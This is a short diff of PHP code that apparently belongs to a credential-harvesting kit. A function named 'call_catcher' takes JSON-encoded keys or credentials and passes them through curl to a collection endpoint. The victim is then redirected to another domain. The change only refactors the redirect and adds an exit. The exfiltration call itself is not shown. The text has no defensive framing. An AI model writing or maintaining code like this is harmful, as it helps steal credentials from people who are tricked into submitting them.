@@ -17,6 +17,8 @@ call_catcher(json_encode($keys));
 
 
 
+
+
 }
 
 /**
@@ -65,12 +67,12 @@ function call_catcher($credentials) {
 
     curl_close($ch);
 
-    redirect();
+    redirect($domain);
+    exit();
 
 }
 
-function redirect() {
-    global $domain;
+function redirect($domain) {
     header("location:http://$domain");
 }
 
